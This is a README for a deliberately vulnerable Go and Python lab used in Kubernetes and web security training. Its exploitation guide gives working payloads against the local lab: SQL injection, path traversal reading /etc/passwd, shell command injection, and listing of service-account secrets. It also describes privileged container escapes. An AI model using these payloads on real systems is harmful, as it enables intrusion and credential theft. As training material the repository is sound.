# Vulnerable Cloud-Native Labs 🚀
**Maintained by [peachycloudsecurity.com](https://peachycloudsecurity.com)**

This repository contains multi-language applications (Go & Python) built to demonstrate **OWASP Kubernetes Top 10 (2025)** risks and common web vulnerabilities. It is intended for security research, CTFs, and DevSecOps training.

---

## 📁 Project Structure
* **vulnerable-go-app/**: Golang implementation focusing on SQLi, Path Traversal, and Command Injection.
* **vulnerable-python-app/**: Python implementation focusing on Command Injection and K8s environment leaks.
* **manifests/**: Kubernetes YAMLs for deploying both applications with Insecure Configurations (K01).

---

## 🛠 Features (Across All Apps)
* **Built-in Logging:** Real-time tracking of Method, Path, Timestamp, and Remote IP for auditing.
* **Health Checks:** Includes `/healthz` and `/readyz` endpoints for Kubernetes probes.
* **K8s Focused:** Specifically crafted to test Pod escapes (HostPath) and Lateral Movement.

---

## 🚀 Quick Start

### 1. Run with Docker
**Go App:**
```bash
docker pull peachycloudsecurity/vulnerable-go-app:latest
docker run -p 8080:8080 peachycloudsecurity/vulnerable-go-app:latest
```

**Python App:**
```bash
docker pull peachycloudsecurity/vulnerable-python-app:latest
docker run -p 8081:8080 peachycloudsecurity/vulnerable-python-app:latest
```

---

## 🛡️ Vulnerability Lab (Exploitation Guide)

### 1. SQL Injection (Go App)
**Endpoint:** `/db?id=`
* **Exploit:** `curl "http://localhost:8080/db?id=1+OR+1=1"`
* **Exfiltration:** `curl "http://localhost:8080/db?id=1+UNION+SELECT+secret+FROM+users"`

### 2. Path Traversal & Host Escape (Go & Python)
**Endpoint:** `/config?source=` (Go) | `/mnt/host/` (Exploit Pod)
* **Exploit:** `curl "http://localhost:8080/config?source=/etc/passwd"`
* **K8s Escape:** Read host files via `vulnerable-exploit-pod` mounted at `/mnt/host`.

### 3. Command Injection (Python & Go)
**Endpoint:** `/ping` (Python - UI) | `/exec?run=` (Go)
* **Python Exploit:** Input `127.0.0.1; whoami; id` in the Ping utility.
* **Go Exploit:** `curl "http://localhost:8080/exec?run=ls+/var/run/secrets/kubernetes.io/serviceaccount/"`

---

## 🚢 Kubernetes Deployment
Deploy using the provided manifests to test **Privileged** container escapes on NodePorts `30080` (Go) and `30081` (Python):

```bash
# Deploy Go App
kubectl apply -f vulnerable-go-app/manifests/deployment.yaml

# Deploy Python App
kubectl apply -f vulnerable-python-app/manifests/deployment.yaml
```

---

### GNU General Public License v3.0
This project is licensed under the **GPL-3.0 License**. You are free to copy, modify, and distribute this software, provided that all derivative works remain under the same license. See the `LICENSE` file for the full text.

### ⚠️ Disclaimer
**FOR EDUCATIONAL PURPOSES ONLY.** Using this tool against target systems without explicit prior permission is illegal. **peachycloudsecurity** and its contributors are not responsible for any misuse, damage, or legal consequences caused by this software. Use it only in controlled lab environments.


1. **Vulnerable by Design:** This application is intentionally insecure. **DO NOT** deploy this in a production environment or any network containing sensitive data.
2. **No Guarantees:** This software is provided "as is" without any warranty of any kind, express or implied. Use it at your own risk.
3. **No Liability:** Under no circumstances shall the author, the maintainer (peachycloudsecurity.com), or any past/present employers and employees be held liable for any direct, indirect, or consequential damages arising from the use or misuse of this software.
4. **Legal Compliance:** Using this tool against target systems without explicit prior permission is illegal. It is the user's responsibility to comply with all applicable local, state, and federal laws.

---

## Peachycloud Security

Hands-On Multi-Cloud & Cloud-Native Security Education

Created by The Shukla Duo (Anjali & Divyanshu), this tool is part of our mission to make cloud security accessible through practical, hands-on learning. We specialize in AWS, GCP, Kubernetes security, and DevSecOps practices.

### Learn & Grow

Explore our educational content and training programs:

[YouTube Channel](https://www.youtube.com/@peachycloudsecurity) | [Website](https://peachycloudsecurity.com) | [1:1 Consultations](https://topmate.io/peachycloudsecurity)

Learn cloud security through hands-on labs, real-world scenarios, and practical tutorials covering GCP & AWS, GKE & EKS, Kubernetes, Containers, DevSecOps, and Threat Modeling.

### Support Our Work

If this tool helps you secure your infrastructure, consider supporting our educational mission:

[Sponsor on GitHub](https://github.com/sponsors/peachycloudsecurity)

Your support helps us create more free educational content and security tools for the community.
